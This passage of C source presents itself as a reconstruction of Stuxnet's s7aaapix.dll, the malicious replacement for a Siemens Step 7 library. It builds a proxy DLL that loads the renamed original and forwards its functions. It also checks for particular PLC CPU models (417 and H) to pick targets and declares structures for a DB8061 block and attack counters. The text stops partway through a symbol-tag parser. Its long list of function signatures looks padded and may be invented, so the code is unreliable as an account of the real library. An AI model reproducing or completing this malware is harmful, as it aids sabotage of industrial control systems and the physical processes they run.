/*
 * Reference from Main/Stuxnet.dll.c s7aaapix.dll [Reference:1]
 */

#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#define S7AAAPIX_ORIGINAL_DLL_NAME      _T("s7aaapix_orig.dll")
#define S7AAAPIX_SELF_DLL_NAME          _T("s7aaapix.dll")
#define S7AAAPIX_MAX_PATH               260
#define S7AAAPIX_BUFFER_SIZE            4096
#define S7AAAPIX_MAX_DB_SIZE            65536

#define S7AAAPIX_MAGIC_DB8061           0x91E55A3D
#define S7AAAPIX_MAGIC_DB8061_2         0x996AB716
#define S7AAAPIX_MAGIC_DB8061_3         0x4A5CB803

#define S7AAAPIX_DB8061_NUMBER          8061
#define S7AAAPIX_TARGET_CPU_417         0x14109A
#define S7AAAPIX_TARGET_CPU_H           0x141342

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400

typedef DWORD (WINAPI *AUTDoVerb)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTOpenObjectSet)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTCloseObjectSet)(DWORD);
typedef DWORD (WINAPI *AUTGetObject)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTPutObject)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTDeleteObject)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTFindFirst)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTFindNext)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetInfo)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetInfo)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetData)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetData)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetVersion)(DWORD, DWORD);
typedef DWORD (WINAPI *AUTInitialize)(DWORD, DWORD);
typedef DWORD (WINAPI *AUTDeinitialize)(DWORD);
typedef DWORD (WINAPI *AUTGetLastError)(DWORD);
typedef DWORD (WINAPI *AUTSetLastError)(DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectSetInfo)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectSetInfo)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectInfo)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectInfo)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectData)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectData)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTDeleteObjectData)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectList)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectSetList)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectType)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectType)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectName)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectName)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectPath)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectPath)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectParent)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectParent)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectChildren)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectAttributes)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectAttributes)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectPermissions)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectPermissions)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectOwner)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectOwner)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectGroup)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectGroup)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectACL)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectACL)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectSID)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectSID)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectGUID)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectGUID)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectCreationTime)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectModificationTime)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectAccessTime)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectSize)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectChecksum)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectChecksum)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectVersion)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectVersion)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectState)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectState)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectStatus)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectStatus)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectError)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectError)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectWarning)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectWarning)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectInfoEx)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectInfoEx)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectDataEx)(DWORD, DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectDataEx)(DWORD, DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTDeleteObjectEx)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTCopyObject)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTMoveObject)(DWORD, DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTRenameObject)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTLockObject)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTUnlockObject)(DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTIsObjectLocked)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockOwner)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockTime)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockDuration)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectLockDuration)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockType)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTSetObjectLockType)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockCount)(DWORD, DWORD, DWORD, DWORD);
typedef DWORD (WINAPI *AUTGetObjectLockList)(DWORD, DWORD, DWORD, DWORD, DWORD);

typedef struct _AUT_FUNCTION_TABLE {
    AUTDoVerb                     pfnAUTDoVerb;
    AUTOpenObjectSet              pfnAUTOpenObjectSet;
    AUTCloseObjectSet             pfnAUTCloseObjectSet;
    AUTGetObject                  pfnAUTGetObject;
    AUTPutObject                  pfnAUTPutObject;
    AUTDeleteObject               pfnAUTDeleteObject;
    AUTFindFirst                  pfnAUTFindFirst;
    AUTFindNext                   pfnAUTFindNext;
    AUTGetInfo                    pfnAUTGetInfo;
    AUTSetInfo                    pfnAUTSetInfo;
    AUTGetData                    pfnAUTGetData;
    AUTSetData                    pfnAUTSetData;
    AUTGetVersion                 pfnAUTGetVersion;
    AUTInitialize                 pfnAUTInitialize;
    AUTDeinitialize               pfnAUTDeinitialize;
    AUTGetLastError               pfnAUTGetLastError;
    AUTSetLastError               pfnAUTSetLastError;
    AUTGetObjectSetInfo           pfnAUTGetObjectSetInfo;
    AUTSetObjectSetInfo           pfnAUTSetObjectSetInfo;
    AUTGetObjectInfo              pfnAUTGetObjectInfo;
    AUTSetObjectInfo              pfnAUTSetObjectInfo;
    AUTGetObjectData              pfnAUTGetObjectData;
    AUTSetObjectData              pfnAUTSetObjectData;
    AUTDeleteObjectData           pfnAUTDeleteObjectData;
    AUTGetObjectList              pfnAUTGetObjectList;
    AUTGetObjectSetList           pfnAUTGetObjectSetList;
    AUTGetObjectType              pfnAUTGetObjectType;
    AUTSetObjectType              pfnAUTSetObjectType;
    AUTGetObjectName              pfnAUTGetObjectName;
    AUTSetObjectName              pfnAUTSetObjectName;
    AUTGetObjectPath              pfnAUTGetObjectPath;
    AUTSetObjectPath              pfnAUTSetObjectPath;
    AUTGetObjectParent            pfnAUTGetObjectParent;
    AUTSetObjectParent            pfnAUTSetObjectParent;
    AUTGetObjectChildren          pfnAUTGetObjectChildren;
    AUTGetObjectAttributes        pfnAUTGetObjectAttributes;
    AUTSetObjectAttributes        pfnAUTSetObjectAttributes;
    AUTGetObjectPermissions       pfnAUTGetObjectPermissions;
    AUTSetObjectPermissions       pfnAUTSetObjectPermissions;
    AUTGetObjectOwner             pfnAUTGetObjectOwner;
    AUTSetObjectOwner             pfnAUTSetObjectOwner;
    AUTGetObjectGroup             pfnAUTGetObjectGroup;
    AUTSetObjectGroup             pfnAUTSetObjectGroup;
    AUTGetObjectACL               pfnAUTGetObjectACL;
    AUTSetObjectACL               pfnAUTSetObjectACL;
    AUTGetObjectSID               pfnAUTGetObjectSID;
    AUTSetObjectSID               pfnAUTSetObjectSID;
    AUTGetObjectGUID              pfnAUTGetObjectGUID;
    AUTSetObjectGUID              pfnAUTSetObjectGUID;
    AUTGetObjectCreationTime      pfnAUTGetObjectCreationTime;
    AUTGetObjectModificationTime  pfnAUTGetObjectModificationTime;
    AUTGetObjectAccessTime        pfnAUTGetObjectAccessTime;
    AUTGetObjectSize              pfnAUTGetObjectSize;
    AUTGetObjectChecksum          pfnAUTGetObjectChecksum;
    AUTSetObjectChecksum          pfnAUTSetObjectChecksum;
    AUTGetObjectVersion           pfnAUTGetObjectVersion;
    AUTSetObjectVersion           pfnAUTSetObjectVersion;
    AUTGetObjectState             pfnAUTGetObjectState;
    AUTSetObjectState             pfnAUTSetObjectState;
    AUTGetObjectStatus            pfnAUTGetObjectStatus;
    AUTSetObjectStatus            pfnAUTSetObjectStatus;
    AUTGetObjectError             pfnAUTGetObjectError;
    AUTSetObjectError             pfnAUTSetObjectError;
    AUTGetObjectWarning           pfnAUTGetObjectWarning;
    AUTSetObjectWarning           pfnAUTSetObjectWarning;
    AUTGetObjectInfoEx            pfnAUTGetObjectInfoEx;
    AUTSetObjectInfoEx            pfnAUTSetObjectInfoEx;
    AUTGetObjectDataEx            pfnAUTGetObjectDataEx;
    AUTSetObjectDataEx            pfnAUTSetObjectDataEx;
    AUTDeleteObjectEx             pfnAUTDeleteObjectEx;
    AUTCopyObject                 pfnAUTCopyObject;
    AUTMoveObject                 pfnAUTMoveObject;
    AUTRenameObject               pfnAUTRenameObject;
    AUTLockObject                 pfnAUTLockObject;
    AUTUnlockObject               pfnAUTUnlockObject;
    AUTIsObjectLocked             pfnAUTIsObjectLocked;
    AUTGetObjectLockOwner         pfnAUTGetObjectLockOwner;
    AUTGetObjectLockTime          pfnAUTGetObjectLockTime;
    AUTGetObjectLockDuration      pfnAUTGetObjectLockDuration;
    AUTSetObjectLockDuration      pfnAUTSetObjectLockDuration;
    AUTGetObjectLockType          pfnAUTGetObjectLockType;
    AUTSetObjectLockType          pfnAUTSetObjectLockType;
    AUTGetObjectLockCount         pfnAUTGetObjectLockCount;
    AUTGetObjectLockList          pfnAUTGetObjectLockList;
} AUT_FUNCTION_TABLE, * PAUT_FUNCTION_TABLE;

static AUT_FUNCTION_TABLE g_OriginalFunctions = {0};
static HMODULE g_hOriginalDll = NULL;
static CRITICAL_SECTION g_csLock;
static BOOL g_bInitialized = FALSE;

static DWORD g_dwCPUType = 0;
static BOOL g_bTargetVerified = FALSE;
static DWORD g_dwDB8061Created = 0;
static DWORD g_dwSymbolCount = 0;
static DWORD g_dwAttackCount = 0;

typedef struct _SYMBOL_TAG {
    WCHAR szFullTag[64];
    WCHAR szDelimiter[4];
    WCHAR szFunctionId[16];
    WCHAR szCascadeModule[8];
    DWORD dwCascadeNumber;
    DWORD dwDeviceNumber;
    DWORD dwDeviceAddress;
} SYMBOL_TAG, * PSYMBOL_TAG;

static SYMBOL_TAG g_SymbolTags[256];
static DWORD g_dwSymbolTagCount = 0;

typedef struct _DB8061_DATA {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwTargetCPUType;
    DWORD dwSymbolCount;
    DWORD dwAttackCount;
    DWORD dwReserved1[8];
    BYTE bSymbolData[4096];
    BYTE bReserved2[4096];
} DB8061_DATA, * PDB8061_DATA;

static DB8061_DATA g_DB8061Data;
static BOOL LoadOriginalDll(VOID);
static VOID InitFunctionPointers(VOID);
static BOOL IsTargetSystem(VOID);
static BOOL CreateDB8061(VOID);
static BOOL ParseSymbolTags(VOID);
static BOOL AddSymbolTag(LPCWSTR szTag);
static DWORD ResolveDeviceAddress(PSYMBOL_TAG pTag);
static BOOL IsValidCPUType(DWORD dwCPUType);
static VOID LogEvent(LPCWSTR szEvent);
static VOID LogError(LPCWSTR szError);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    TCHAR szDbgMsg[256];

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            wsprintf(szDbgMsg, _T("[S7AAAPIX] DllMain: PROCESS_ATTACH, PID=%d\n"), GetCurrentProcessId());
            OutputDebugString(szDbgMsg);

            InitializeCriticalSection(&g_csLock);

            if (!LoadOriginalDll()) {
                wsprintf(szDbgMsg, _T("[S7AAAPIX] ERROR: Failed to load original DLL %s\n"), S7AAAPIX_ORIGINAL_DLL_NAME);
                OutputDebugString(szDbgMsg);
            } else {
                InitFunctionPointers();
                g_bInitialized = TRUE;
                wsprintf(szDbgMsg, _T("[S7AAAPIX] Initialized successfully. Original DLL loaded at 0x%08X\n"), g_hOriginalDll);
                OutputDebugString(szDbgMsg);
            }
            break;

        case DLL_PROCESS_DETACH:
            wsprintf(szDbgMsg, _T("[S7AAAPIX] DllMain: PROCESS_DETACH\n"));
            OutputDebugString(szDbgMsg);

            if (g_hOriginalDll) {
                FreeLibrary(g_hOriginalDll);
                g_hOriginalDll = NULL;
            }
            DeleteCriticalSection(&g_csLock);
            g_bInitialized = FALSE;
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

static BOOL LoadOriginalDll(VOID) {
    TCHAR szSystemPath[MAX_PATH];
    TCHAR szDllPath[MAX_PATH];
    TCHAR szProgramFilesPath[MAX_PATH];

    if (GetSystemDirectory(szSystemPath, MAX_PATH)) {
        wsprintf(szDllPath, _T("%s\\%s"), szSystemPath, S7AAAPIX_ORIGINAL_DLL_NAME);
        g_hOriginalDll = LoadLibrary(szDllPath);
        if (g_hOriginalDll) {
            return TRUE;
        }
    }

    if (GetEnvironmentVariable(_T("ProgramFiles"), szProgramFilesPath, MAX_PATH)) {
        wsprintf(szDllPath, _T("%s\\Siemens\\Step7\\S7BIN\\%s"), szProgramFilesPath, S7AAAPIX_ORIGINAL_DLL_NAME);
        g_hOriginalDll = LoadLibrary(szDllPath);
        if (g_hOriginalDll) {
            return TRUE;
        }
    }

    g_hOriginalDll = LoadLibrary(S7AAAPIX_ORIGINAL_DLL_NAME);
    return (g_hOriginalDll != NULL);
}

static VOID InitFunctionPointers(VOID) {
    g_OriginalFunctions.pfnAUTDoVerb = (AUTDoVerb)GetProcAddress(g_hOriginalDll, "AUTDoVerb");
    g_OriginalFunctions.pfnAUTOpenObjectSet = (AUTOpenObjectSet)GetProcAddress(g_hOriginalDll, "AUTOpenObjectSet");
    g_OriginalFunctions.pfnAUTCloseObjectSet = (AUTCloseObjectSet)GetProcAddress(g_hOriginalDll, "AUTCloseObjectSet");
    g_OriginalFunctions.pfnAUTGetObject = (AUTGetObject)GetProcAddress(g_hOriginalDll, "AUTGetObject");
    g_OriginalFunctions.pfnAUTPutObject = (AUTPutObject)GetProcAddress(g_hOriginalDll, "AUTPutObject");
    g_OriginalFunctions.pfnAUTDeleteObject = (AUTDeleteObject)GetProcAddress(g_hOriginalDll, "AUTDeleteObject");
    g_OriginalFunctions.pfnAUTFindFirst = (AUTFindFirst)GetProcAddress(g_hOriginalDll, "AUTFindFirst");
    g_OriginalFunctions.pfnAUTFindNext = (AUTFindNext)GetProcAddress(g_hOriginalDll, "AUTFindNext");
    g_OriginalFunctions.pfnAUTGetInfo = (AUTGetInfo)GetProcAddress(g_hOriginalDll, "AUTGetInfo");
    g_OriginalFunctions.pfnAUTSetInfo = (AUTSetInfo)GetProcAddress(g_hOriginalDll, "AUTSetInfo");
    g_OriginalFunctions.pfnAUTGetData = (AUTGetData)GetProcAddress(g_hOriginalDll, "AUTGetData");
    g_OriginalFunctions.pfnAUTSetData = (AUTSetData)GetProcAddress(g_hOriginalDll, "AUTSetData");
    g_OriginalFunctions.pfnAUTGetVersion = (AUTGetVersion)GetProcAddress(g_hOriginalDll, "AUTGetVersion");
    g_OriginalFunctions.pfnAUTInitialize = (AUTInitialize)GetProcAddress(g_hOriginalDll, "AUTInitialize");
    g_OriginalFunctions.pfnAUTDeinitialize = (AUTDeinitialize)GetProcAddress(g_hOriginalDll, "AUTDeinitialize");
    g_OriginalFunctions.pfnAUTGetLastError = (AUTGetLastError)GetProcAddress(g_hOriginalDll, "AUTGetLastError");
    g_OriginalFunctions.pfnAUTSetLastError = (AUTSetLastError)GetProcAddress(g_hOriginalDll, "AUTSetLastError");
    g_OriginalFunctions.pfnAUTGetObjectSetInfo = (AUTGetObjectSetInfo)GetProcAddress(g_hOriginalDll, "AUTGetObjectSetInfo");
    g_OriginalFunctions.pfnAUTSetObjectSetInfo = (AUTSetObjectSetInfo)GetProcAddress(g_hOriginalDll, "AUTSetObjectSetInfo");
    g_OriginalFunctions.pfnAUTGetObjectInfo = (AUTGetObjectInfo)GetProcAddress(g_hOriginalDll, "AUTGetObjectInfo");
    g_OriginalFunctions.pfnAUTSetObjectInfo = (AUTSetObjectInfo)GetProcAddress(g_hOriginalDll, "AUTSetObjectInfo");
    g_OriginalFunctions.pfnAUTGetObjectData = (AUTGetObjectData)GetProcAddress(g_hOriginalDll, "AUTGetObjectData");
    g_OriginalFunctions.pfnAUTSetObjectData = (AUTSetObjectData)GetProcAddress(g_hOriginalDll, "AUTSetObjectData");
    g_OriginalFunctions.pfnAUTDeleteObjectData = (AUTDeleteObjectData)GetProcAddress(g_hOriginalDll, "AUTDeleteObjectData");
    g_OriginalFunctions.pfnAUTGetObjectList = (AUTGetObjectList)GetProcAddress(g_hOriginalDll, "AUTGetObjectList");
    g_OriginalFunctions.pfnAUTGetObjectSetList = (AUTGetObjectSetList)GetProcAddress(g_hOriginalDll, "AUTGetObjectSetList");
    g_OriginalFunctions.pfnAUTGetObjectType = (AUTGetObjectType)GetProcAddress(g_hOriginalDll, "AUTGetObjectType");
    g_OriginalFunctions.pfnAUTSetObjectType = (AUTSetObjectType)GetProcAddress(g_hOriginalDll, "AUTSetObjectType");
    g_OriginalFunctions.pfnAUTGetObjectName = (AUTGetObjectName)GetProcAddress(g_hOriginalDll, "AUTGetObjectName");
    g_OriginalFunctions.pfnAUTSetObjectName = (AUTSetObjectName)GetProcAddress(g_hOriginalDll, "AUTSetObjectName");
    g_OriginalFunctions.pfnAUTGetObjectPath = (AUTGetObjectPath)GetProcAddress(g_hOriginalDll, "AUTGetObjectPath");
    g_OriginalFunctions.pfnAUTSetObjectPath = (AUTSetObjectPath)GetProcAddress(g_hOriginalDll, "AUTSetObjectPath");
    g_OriginalFunctions.pfnAUTGetObjectParent = (AUTGetObjectParent)GetProcAddress(g_hOriginalDll, "AUTGetObjectParent");
    g_OriginalFunctions.pfnAUTSetObjectParent = (AUTSetObjectParent)GetProcAddress(g_hOriginalDll, "AUTSetObjectParent");
    g_OriginalFunctions.pfnAUTGetObjectChildren = (AUTGetObjectChildren)GetProcAddress(g_hOriginalDll, "AUTGetObjectChildren");
    g_OriginalFunctions.pfnAUTGetObjectAttributes = (AUTGetObjectAttributes)GetProcAddress(g_hOriginalDll, "AUTGetObjectAttributes");
    g_OriginalFunctions.pfnAUTSetObjectAttributes = (AUTSetObjectAttributes)GetProcAddress(g_hOriginalDll, "AUTSetObjectAttributes");
    g_OriginalFunctions.pfnAUTGetObjectPermissions = (AUTGetObjectPermissions)GetProcAddress(g_hOriginalDll, "AUTGetObjectPermissions");
    g_OriginalFunctions.pfnAUTSetObjectPermissions = (AUTSetObjectPermissions)GetProcAddress(g_hOriginalDll, "AUTSetObjectPermissions");
    g_OriginalFunctions.pfnAUTGetObjectOwner = (AUTGetObjectOwner)GetProcAddress(g_hOriginalDll, "AUTGetObjectOwner");
    g_OriginalFunctions.pfnAUTSetObjectOwner = (AUTSetObjectOwner)GetProcAddress(g_hOriginalDll, "AUTSetObjectOwner");
    g_OriginalFunctions.pfnAUTGetObjectGroup = (AUTGetObjectGroup)GetProcAddress(g_hOriginalDll, "AUTGetObjectGroup");
    g_OriginalFunctions.pfnAUTSetObjectGroup = (AUTSetObjectGroup)GetProcAddress(g_hOriginalDll, "AUTSetObjectGroup");
    g_OriginalFunctions.pfnAUTGetObjectACL = (AUTGetObjectACL)GetProcAddress(g_hOriginalDll, "AUTGetObjectACL");
    g_OriginalFunctions.pfnAUTSetObjectACL = (AUTSetObjectACL)GetProcAddress(g_hOriginalDll, "AUTSetObjectACL");
    g_OriginalFunctions.pfnAUTGetObjectSID = (AUTGetObjectSID)GetProcAddress(g_hOriginalDll, "AUTGetObjectSID");
    g_OriginalFunctions.pfnAUTSetObjectSID = (AUTSetObjectSID)GetProcAddress(g_hOriginalDll, "AUTSetObjectSID");
    g_OriginalFunctions.pfnAUTGetObjectGUID = (AUTGetObjectGUID)GetProcAddress(g_hOriginalDll, "AUTGetObjectGUID");
    g_OriginalFunctions.pfnAUTSetObjectGUID = (AUTSetObjectGUID)GetProcAddress(g_hOriginalDll, "AUTSetObjectGUID");
    g_OriginalFunctions.pfnAUTGetObjectCreationTime = (AUTGetObjectCreationTime)GetProcAddress(g_hOriginalDll, "AUTGetObjectCreationTime");
    g_OriginalFunctions.pfnAUTGetObjectModificationTime = (AUTGetObjectModificationTime)GetProcAddress(g_hOriginalDll, "AUTGetObjectModificationTime");
    g_OriginalFunctions.pfnAUTGetObjectAccessTime = (AUTGetObjectAccessTime)GetProcAddress(g_hOriginalDll, "AUTGetObjectAccessTime");
    g_OriginalFunctions.pfnAUTGetObjectSize = (AUTGetObjectSize)GetProcAddress(g_hOriginalDll, "AUTGetObjectSize");
    g_OriginalFunctions.pfnAUTGetObjectChecksum = (AUTGetObjectChecksum)GetProcAddress(g_hOriginalDll, "AUTGetObjectChecksum");
    g_OriginalFunctions.pfnAUTSetObjectChecksum = (AUTSetObjectChecksum)GetProcAddress(g_hOriginalDll, "AUTSetObjectChecksum");
    g_OriginalFunctions.pfnAUTGetObjectVersion = (AUTGetObjectVersion)GetProcAddress(g_hOriginalDll, "AUTGetObjectVersion");
    g_OriginalFunctions.pfnAUTSetObjectVersion = (AUTSetObjectVersion)GetProcAddress(g_hOriginalDll, "AUTSetObjectVersion");
    g_OriginalFunctions.pfnAUTGetObjectState = (AUTGetObjectState)GetProcAddress(g_hOriginalDll, "AUTGetObjectState");
    g_OriginalFunctions.pfnAUTSetObjectState = (AUTSetObjectState)GetProcAddress(g_hOriginalDll, "AUTSetObjectState");
    g_OriginalFunctions.pfnAUTGetObjectStatus = (AUTGetObjectStatus)GetProcAddress(g_hOriginalDll, "AUTGetObjectStatus");
    g_OriginalFunctions.pfnAUTSetObjectStatus = (AUTSetObjectStatus)GetProcAddress(g_hOriginalDll, "AUTSetObjectStatus");
    g_OriginalFunctions.pfnAUTGetObjectError = (AUTGetObjectError)GetProcAddress(g_hOriginalDll, "AUTGetObjectError");
    g_OriginalFunctions.pfnAUTSetObjectError = (AUTSetObjectError)GetProcAddress(g_hOriginalDll, "AUTSetObjectError");
    g_OriginalFunctions.pfnAUTGetObjectWarning = (AUTGetObjectWarning)GetProcAddress(g_hOriginalDll, "AUTGetObjectWarning");
    g_OriginalFunctions.pfnAUTSetObjectWarning = (AUTSetObjectWarning)GetProcAddress(g_hOriginalDll, "AUTSetObjectWarning");
    g_OriginalFunctions.pfnAUTGetObjectInfoEx = (AUTGetObjectInfoEx)GetProcAddress(g_hOriginalDll, "AUTGetObjectInfoEx");
    g_OriginalFunctions.pfnAUTSetObjectInfoEx = (AUTSetObjectInfoEx)GetProcAddress(g_hOriginalDll, "AUTSetObjectInfoEx");
    g_OriginalFunctions.pfnAUTGetObjectDataEx = (AUTGetObjectDataEx)GetProcAddress(g_hOriginalDll, "AUTGetObjectDataEx");
    g_OriginalFunctions.pfnAUTSetObjectDataEx = (AUTSetObjectDataEx)GetProcAddress(g_hOriginalDll, "AUTSetObjectDataEx");
    g_OriginalFunctions.pfnAUTDeleteObjectEx = (AUTDeleteObjectEx)GetProcAddress(g_hOriginalDll, "AUTDeleteObjectEx");
    g_OriginalFunctions.pfnAUTCopyObject = (AUTCopyObject)GetProcAddress(g_hOriginalDll, "AUTCopyObject");
    g_OriginalFunctions.pfnAUTMoveObject = (AUTMoveObject)GetProcAddress(g_hOriginalDll, "AUTMoveObject");
    g_OriginalFunctions.pfnAUTRenameObject = (AUTRenameObject)GetProcAddress(g_hOriginalDll, "AUTRenameObject");
    g_OriginalFunctions.pfnAUTLockObject = (AUTLockObject)GetProcAddress(g_hOriginalDll, "AUTLockObject");
    g_OriginalFunctions.pfnAUTUnlockObject = (AUTUnlockObject)GetProcAddress(g_hOriginalDll, "AUTUnlockObject");
    g_OriginalFunctions.pfnAUTIsObjectLocked = (AUTIsObjectLocked)GetProcAddress(g_hOriginalDll, "AUTIsObjectLocked");
    g_OriginalFunctions.pfnAUTGetObjectLockOwner = (AUTGetObjectLockOwner)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockOwner");
    g_OriginalFunctions.pfnAUTGetObjectLockTime = (AUTGetObjectLockTime)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockTime");
    g_OriginalFunctions.pfnAUTGetObjectLockDuration = (AUTGetObjectLockDuration)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockDuration");
    g_OriginalFunctions.pfnAUTSetObjectLockDuration = (AUTSetObjectLockDuration)GetProcAddress(g_hOriginalDll, "AUTSetObjectLockDuration");
    g_OriginalFunctions.pfnAUTGetObjectLockType = (AUTGetObjectLockType)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockType");
    g_OriginalFunctions.pfnAUTSetObjectLockType = (AUTSetObjectLockType)GetProcAddress(g_hOriginalDll, "AUTSetObjectLockType");
    g_OriginalFunctions.pfnAUTGetObjectLockCount = (AUTGetObjectLockCount)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockCount");
    g_OriginalFunctions.pfnAUTGetObjectLockList = (AUTGetObjectLockList)GetProcAddress(g_hOriginalDll, "AUTGetObjectLockList");
}

static BOOL IsTargetSystem(VOID) {
    if (!g_OriginalFunctions.pfnAUTGetInfo) return FALSE;

    g_dwCPUType = 0;
    g_OriginalFunctions.pfnAUTGetInfo(0, 0, (DWORD)&g_dwCPUType);

    if (IsValidCPUType(g_dwCPUType)) {
        g_bTargetVerified = TRUE;
        return TRUE;
    }

    g_bTargetVerified = FALSE;
    return FALSE;
}

static BOOL IsValidCPUType(DWORD dwCPUType) {
    if (dwCPUType == S7AAAPIX_TARGET_CPU_417) {
        return TRUE;
    }
    if (dwCPUType == S7AAAPIX_TARGET_CPU_H) {
        return TRUE;
    }
    return FALSE;
}

static BOOL ParseSymbolTags(VOID) {
    DWORD dwIndex = 0;
    WCHAR szTagBuffer[256];
    WCHAR szCurrentTag[64];
    DWORD dwPos = 0;
    BOOL bInTag = FALSE;

